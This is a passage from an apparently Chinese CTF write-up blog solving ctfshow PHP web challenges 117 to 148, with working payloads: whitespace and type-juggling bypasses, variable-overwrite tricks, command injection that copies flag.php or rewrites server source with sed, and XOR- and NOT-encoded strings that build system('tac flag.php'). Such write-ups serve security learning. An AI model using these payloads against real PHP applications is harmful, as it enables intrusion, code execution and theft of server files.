class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">128</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$temp</span> <span class=\"token operator\">=</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>得到</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>%0C1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>%2B1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>-1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>.1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>01</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>11</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>21</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>31</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>41</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>51</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>61</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>71</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>81</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>91</pre></td></tr></tbody></table></figure><p>对比过滤的符号，发现只有 <code>%0c</code>  可以用</p>\n<p>payload: <code>?num=%0c36</code></p>\n<h1 id=\"web-117\"><a class=\"anchor\" href=\"#web-117\">#</a> web 117</h1>\n<p>主要是要通过这些判断语句</p>\n<p><code>is_numeric($num)</code></p>\n<p><code>$num !== '36'</code></p>\n<p><code>trim($num) !== '36'</code></p>\n<p><code>filter($num) == '36') $num == '36'</code></p>\n<p><code>is_numeric()</code>  用于判断 <code>num</code>  是否为一个数字，在数字前面加上如 <code>%20</code>  的空格，那么仍为 <code>true</code> ，如果在后面加，那么为 <code>false</code></p>\n<p>第二句为不全等于，如果加了空格，因为比较的是字符串的内容，所以一定能通过</p>\n<p>第三句为 <code>trim()</code>  函数的应用</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，<span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 将去除这些字符： </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\" \"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，普通空格符。  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\"\\t\"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">9</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x09</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，制表符。  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\"\\n\"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x0A</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，换行符。  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\"\\r\"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">13</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x0D</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，回车符。  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\"\\0\"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，空字节符。  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\"\\x0B\"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">11</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x0B</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，垂直制表符。</pre></td></tr></tbody></table></figure><p>`</p>\n<p><code>%0c</code>  也还是可以使用，因此可以输入 <code>%0c36</code>  绕过</p>\n<p>第四句为函数 `filter 的通过，观察代码，上述能通过</p>\n<p>第五句为弱等于，由于比较的内容中有数字，因此两边都转换为数字，经过本地测试， <code>%0c36</code>  转换成了数字 36，因此也能通过判断</p>\n<p>所以 payload: <code>?num=%0c36</code></p>\n<h1 id=\"web-123\"><a class=\"anchor\" href=\"#web-123\">#</a> web 123</h1>\n<p>对于该题，看到需要 <code>POST CT_SHOW</code>  和 <code>CTF_SHOW.COM</code>  的值</p>\n<p>由于 PHP 变量只能由数字字母下划线，故如果直接上传 <code>CTF_SHOW.COM</code>  后， <code>.</code>  会自动转换成下划线，上传的实际上是 <code>CTF_SHOW_COM</code>  的变量</p>\n<p>而为了防止对后面的点进行转换，可以将 <code>CTF</code>  后的下划线改为左方括号，这样，只会将该括号改为下划线，而后面的点不受影响，但是如果将其换为 <code>.</code>  或 <code>+</code> ，两个符号均会变成下划线</p>\n<p>再看代码，之后会进行 <code>eval</code>  函数，  <code>$c</code>  为 POST 传入的 <code>$fun</code>  值</p>\n<h2 id=\"解法一-3\"><a class=\"anchor\" href=\"#解法一-3\">#</a> 解法一</h2>\n<p>传入命令 <code>extract($_POST)</code>  将变量转为 POST 类型，然后通过 POST 传入 <code>fl0g=flag_give_me</code>  绕过对 GET 变量的判断，并且满足第二个判断条件</p>\n<p>payload:  <code>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=extract($_POST)&amp;fl0g=flag_give_me</code></p>\n<h2 id=\"解法二-3\"><a class=\"anchor\" href=\"#解法二-3\">#</a> 解法二</h2>\n<p><code>get_defined_vars</code>  —— 返回由所有已定义变量所组成的数组</p>\n<p>由于返回的是数组， <code>echo</code>  输出数组只能输出 <code>Array</code> ，因此需要一个输出数组的函数或者将数组转换为字符串</p>\n<p>但输出数组的函数 <code>var_dump()</code> , <code>print_r()</code>  被禁用，故尝试使数组转换为字符串</p>\n<ul>\n<li>\n<p>implode</p>\n<p>implode —— 将一个一维数组的值转化为字符串</p>\n<p>payload: <code>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo implode(get_defined_vars())</code></p>\n</li>\n</ul>\n<h2 id=\"解法三\"><a class=\"anchor\" href=\"#解法三\">#</a> 解法三</h2>\n<p>利用 <code>argv</code>  数组</p>\n<p>数组中，用空格来进行值的分别</p>\n<p>GET: <code>?a=1+fl0g=flag_give_me</code></p>\n<p>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</code></p>\n<h2 id=\"解法四\"><a class=\"anchor\" href=\"#解法四\">#</a> 解法四</h2>\n<p>GET: <code>1=flag.php</code></p>\n<p>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</code></p>\n<h2 id=\"解法五\"><a class=\"anchor\" href=\"#解法五\">#</a> 解法五</h2>\n<p><code>var_dump($GLOBALS)</code></p>\n<h1 id=\"web-125\"><a class=\"anchor\" href=\"#web-125\">#</a> web 125</h1>\n<p>过滤了 <code>flag|GLOBALS|echo|var_dump|print</code></p>\n<p>仍可使用上面的法 1、法 3、法 4</p>\n<h1 id=\"web-126\"><a class=\"anchor\" href=\"#web-126\">#</a> web 126</h1>\n<p>使用法三</p>\n<h1 id=\"web-127\"><a class=\"anchor\" href=\"#web-127\">#</a> web 127</h1>\n<p>用空格绕过  <code>_</code></p>\n<p><code>?ctf show=ilove36d</code></p>\n<p><code>$_SERVER [QUERY_STRING]</code> ，经过验证，不能显示 post 传参的内容，故只能采取 get 传参</p>\n<h1 id=\"web-128\"><a class=\"anchor\" href=\"#web-128\">#</a> web 128</h1>\n<p>主要使用 <code>gettext</code>  函数</p>\n<p>获取当前信息，可以获取到参数中的值，而它又可以使用 <code>_</code> 代替该函数</p>\n<p>所以 payload: <code>?f1=_&amp;f2=get_defined_vars</code></p>\n<h1 id=\"web-129\"><a class=\"anchor\" href=\"#web-129\">#</a> web 129</h1>\n<p>目录穿越</p>\n<p><code>../ctfshow/../html/flag.php</code>  （或其他)</p>\n<h1 id=\"web-130\"><a class=\"anchor\" href=\"#web-130\">#</a> web 130</h1>\n<p><code>f=ctfshow</code></p>\n<p>或数组绕过</p>\n<p><code>f[]=1</code></p>\n<h1 id=\"web-131\"><a class=\"anchor\" href=\"#web-131\">#</a> web 131</h1>\n<p><code>$a = str_repeat(\"show\",250000); $b = $a . \"36Dctfshow\"; echo $b;</code></p>\n<p>长度限制，绕过正则</p>\n<h1 id=\"web-132\"><a class=\"anchor\" href=\"#web-132\">#</a> web 132</h1>\n<p>逻辑运算符的优先级判断</p>\n<p>payload: <code>?username=admin&amp;password=1&amp;code=adm3in</code></p>\n<h1 id=\"web-133\"><a class=\"anchor\" href=\"#web-133\">#</a> web 133</h1>\n<h2 id=\"curl-外带\"><a class=\"anchor\" href=\"#curl-外带\">#</a> curl 外带</h2>\n<p>curl</p>\n<h2 id=\"linux-中的-cp-命令\"><a class=\"anchor\" href=\"#linux-中的-cp-命令\">#</a> Linux 中的 cp 命令</h2>\n<p>利用 <code>cp</code>  命令将 flag.php 写入 1.txt，然后访问 1.txt</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?F=`$F` ;cp flag.php 1234.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>/1234.txt</pre></td></tr></tbody></table></figure><p>注意是反引号，相当于 shell_exec () 函数</p>\n<p>成功原因</p>\n<p>虽然 <code>substr</code>  只取前六位，但在该 payload 中，由于前六位是</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>`$F` ;</pre></td></tr></tbody></table></figure><p>读入后变量的值会放进去变成</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>``$F` ;cp flag.php 1234.txt`</pre></td></tr></tbody></table></figure><h2 id=\"ping\"><a class=\"anchor\" href=\"#ping\">#</a> PING</h2>\n<h1 id=\"web-134\"><a class=\"anchor\" href=\"#web-134\">#</a> web 134</h1>\n<p>观察代码</p>\n<p><code>parse_str</code>  — 将字符串解析成多个变量</p>\n<p><code>extract</code>  — 从数组中将变量导入到当前的符号表 (如果变量已存在，将会覆盖变量)</p>\n<p>由于不能在 POST 里直接传 <code>key1</code>  和 <code>key2</code>  的值，所以可以通过 GET 方式，传入变量名为 <code>_POST</code>  的变量，使得其在之后的 <code>extract</code>  能够覆盖原理啊的 <code>key1</code>  和 <code>key2</code></p>\n<p>payload: <code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p>\n<h1 id=\"web-135\"><a class=\"anchor\" href=\"#web-135\">#</a> web 135</h1>\n<h2 id=\"cp-命令\"><a class=\"anchor\" href=\"#cp-命令\">#</a> cp 命令</h2>\n<h2 id=\"ping-2\"><a class=\"anchor\" href=\"#ping-2\">#</a> ping</h2>\n<h2 id=\"web-136\"><a class=\"anchor\" href=\"#web-136\">#</a> web 136</h2>\n<h2 id=\"tee-命令\"><a class=\"anchor\" href=\"#tee-命令\">#</a> tee 命令</h2>\n<p><code>?c=ls /|tee 1</code></p>\n<p>将 <code>ls /</code>  的回显写入 1 文件</p>\n<p>使用 nl 命令</p>\n<p>之后可以使用同样命令，然后返回即可</p>\n<h2 id=\"修改文件内容\"><a class=\"anchor\" href=\"#修改文件内容\">#</a> 修改文件内容</h2>\n<p><code>?c=ls |xargs sed -i 's/exec/echo/'</code></p>\n<p><code>?c=ls |xargs sed -i 's/exec/system/'</code></p>\n<p>重新访问题目，可以发现字符串匹配下 <code>die</code>  变为 <code>echo</code> ，也就是说，即使满足正则匹配，代码不会结束，会执行后面的代码</p>\n<p>无回显的 <code>exec</code>  变为了 <code>system</code> ，可以输入命令并回显</p>\n<h1 id=\"web-137\"><a class=\"anchor\" href=\"#web-137\">#</a> web 137</h1>\n<p>类静态方法的访问</p>\n<p>POST:  <code>ctfshow=ctfshow::getFLag</code></p>\n<h1 id=\"web-138\"><a class=\"anchor\" href=\"#web-138\">#</a> web 138</h1>\n<p>ban 掉了冒号</p>\n<p>查看文档，找寻访问静态方法的另一种手段</p>\n<p><code>call_user_func</code></p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/static_visit.png\" alt=\"\"></p>\n<p>也就是说可以通过给 <code>call_user_func</code>  传入一个数组，使其访问</p>\n<p>所以 payload: <code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code> （该语句意义为给 ctfshow [] 赋两个值）</p>\n<h1 id=\"web-139\"><a class=\"anchor\" href=\"#web-139\">#</a> web 139</h1>\n<p>经过测试，如果想要 <code>intval($code) == 'ctfshow'</code>  为 true</p>\n<p>那么 <code>code</code>  也应该为字符串</p>\n<p>而 <code>$code = eval(\"return $f1($f2());\");</code></p>\n<p>所以必须要使函数返回字符串，</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>f1<span class=\"token operator\">=</span>system<span class=\"token operator\">&amp;</span>f2<span class=\"token operator\">=</span>getcwd</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>f1<span class=\"token operator\">=</span>system<span class=\"token operator\">&amp;</span>f2<span class=\"token operator\">=</span>system</pre></td></tr></tbody></table></figure><h1 id=\"web-141\"><a class=\"anchor\" href=\"#web-141\">#</a> web 141</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^\\W+$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span> = \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>由判断及正则匹配，知 v1，v2 为数字，v3 为非字母</p>\n<p>测试</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$test</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>test<span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p><code>phpinfo()</code>  被成功执行，也就是说该写法成立 (相当于以前的 `eval ($c));?c=phpinfo ())</p>\n<p>在上面的语句中，分号已写不用自己补，因此会执行该代码</p>\n<p>而由于题目执行的代码是 <code>$v1$v3$v2</code> , <code>v1</code> ， <code>v2</code>  必为数字，所以可控的字符只有 <code>v3</code> ，并要将其于前后分开</p>\n<p>进行测试</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token operator\">-</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><p>可以执行，所以可以传入 <code>?v1=1&amp;v2=1&amp;v3=</code>  命令进行</p>\n<p>但又因 <code>3</code>  不能出现字母，而大多数函数都有字母，这里采用 <code>16</code>  进制构造的方法构造出命令</p>\n<p>例如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//system('ls')</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f9<span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e5<span class=\"token operator\">%</span>ed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>ec<span class=\"token operator\">%</span>f3<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>   </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//system('tac flag.php')</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f9<span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e5<span class=\"token operator\">%</span>ed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e1<span class=\"token operator\">%</span>e3<span class=\"token operator\">%</span>a0<span class=\"token operator\">%</span>e6<span class=\"token operator\">%</span>ec<span class=\"token operator\">%</span>e1<span class=\"token operator\">%</span>e7<span class=\"token operator\">%</span>ae<span class=\"token operator\">%</span>f0<span class=\"token operator\">%</span>e8<span class=\"token operator\">%</span>f0<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span></pre></td></tr></tbody></table></figure><h1 id=\"web-142\"><a class=\"anchor\" href=\"#web-142\">#</a> web 142</h1>\n<p>输入小于等于 0 的数字即可</p>\n<h1 id=\"web-143\"><a class=\"anchor\" href=\"#web-143\">#</a> web 143</h1>\n<p>同 141，把减号换成乘号</p>\n<h1 id=\"web-144\"><a class=\"anchor\" href=\"#web-144\">#</a> web 144</h1>\n<p>原理同 141, 调整一下 v2，v3</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f9<span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e5<span class=\"token operator\">%</span>ed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e1<span class=\"token operator\">%</span>e3<span class=\"token operator\">%</span>a0<span class=\"token operator\">%</span>e6<span class=\"token operator\">%</span>ec<span class=\"token operator\">%</span>e1<span class=\"token operator\">%</span>e7<span class=\"token operator\">%</span>ae<span class=\"token operator\">%</span>f0<span class=\"token operator\">%</span>e8<span class=\"token operator\">%</span>f0<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token operator\">-</span></pre></td></tr></tbody></table></figure><h1 id=\"web-145\"><a class=\"anchor\" href=\"#web-145\">#</a> web 145</h1>\n<p>相同原理</p>\n<p>这里使用取反运算 (或运算不能用，应为如果要用或，那么值一定在 0-128 内，而此时因为绝大部分可用字符被禁，也就是说此时不能构造出满足条件的)</p>\n<p>并使用三元条目运算符  <code>?ex1:ex2</code></p>\n<p><code>?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):</code></p>\n<p>或者用没有过滤的或运算</p>\n<p><code>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|</code></p>\n<h1 id=\"web-146\"><a class=\"anchor\" href=\"#web-146\">#</a> web 146</h1>\n<p>同 145 第二种解法</p>\n<h1 id=\"web-147\"><a class=\"anchor\" href=\"#web-147\">#</a> web 147</h1>\n<p><code>if (!preg_match('/^[a-z0-9_]*$/isD', $ctfshow))</code></p>\n<p>不能有数字字母开头</p>\n<p>利用命名空间 <code>\\函数名</code></p>\n<p>首先使用 <code>\\phpinfo</code> , 发现提示用了 2 个函数</p>\n<p>这里可以采用匿名函数，然后传入 <code>show</code>  使其闭合 <code>if</code>  判断，最后注释后面的语句</p>\n<p>payload:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>show<span class=\"token operator\">=</span><span class=\"token punctuation\">}</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tac flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">/</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ctf<span class=\"token operator\">=</span>\\create_function</pre></td></tr></tbody></table></figure><h1 id=\"web-148\"><a class=\"anchor\" href=\"#web-148\">#</a> web 148</h1>\n<p>同 141</p>\n<p><strong>或者</strong></p>\n<p>调用函数方法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">get_ctfshow_fl0g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>code <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>e7<span class=\"token operator\">%</span>e5<span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>df<span class=\"token operator\">%</span>e3<span class=\"token operator\">%</span>f4<span 